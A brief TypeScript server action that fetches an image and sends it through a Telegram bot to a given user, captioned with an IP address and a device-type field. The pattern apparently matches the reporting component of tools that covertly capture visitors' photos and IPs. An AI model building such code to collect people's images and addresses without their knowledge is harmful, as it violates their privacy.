"use server";

import { InputFile } from "grammy";
import { bot } from "~/bot";

interface Props {
	photo: string;
	userId: string;
	ip: string;
}

export async function sendDataToBot({ photo, userId, ip }: Props) {
	const blob = await fetch(photo).then((res) => res.blob());
	try {
		await bot.api.sendPhoto(userId, new InputFile(Buffer.from(await blob.arrayBuffer())), {
			caption: `IP: ${ip}\n` + "Device Type: unknown\n\n",
		});
	} catch (e) {
		console.error(e);
	}
}
